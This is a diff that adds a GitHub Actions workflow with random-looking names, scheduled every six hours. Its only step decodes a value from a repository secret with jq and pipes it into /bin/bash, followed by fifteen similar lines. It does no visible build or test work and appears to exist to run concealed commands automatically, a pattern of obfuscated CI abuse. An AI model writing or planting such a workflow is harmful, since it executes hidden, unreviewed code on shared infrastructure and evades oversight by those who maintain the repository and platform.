@@ -1,0 +1,34 @@
+name: sveltesimonv1
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sveltesimonv1
+        env:
+          bwmxj256: ${{ secrets.bwmxj256 }}
+        run: |
+          echo $bwmxj256 | jq -r .pva3606 | /bin/bash
+          echo $tz96 | jq -r .jal016 | /bin/bash
+          echo $ynqa868 | jq -r .wy55667 | /bin/bash
+          echo $jwwh2227 | jq -r .ywv975 | /bin/bash
+          echo $qshz55 | jq -r .z21 | /bin/bash
+          echo $mmju60768 | jq -r .csgyi56 | /bin/bash
+          echo $ybt32 | jq -r .ju12 | /bin/bash
+          echo $eh6968 | jq -r .qt6 | /bin/bash
+          echo $wloz833 | jq -r .hhppc69 | /bin/bash
+          echo $qj197 | jq -r .hoqtk1838 | /bin/bash
+          echo $jibr423 | jq -r .u272 | /bin/bash
+          echo $ie923 | jq -r .gx67131 | /bin/bash
+          echo $a123 | jq -r .jum202 | /bin/bash
+          echo $vaptk5 | jq -r .znm426 | /bin/bash
+          echo $wuf0 | jq -r .sivdn91375 | /bin/bash
+          echo $vgg4764 | jq -r .lcrqu7 | /bin/bash
+
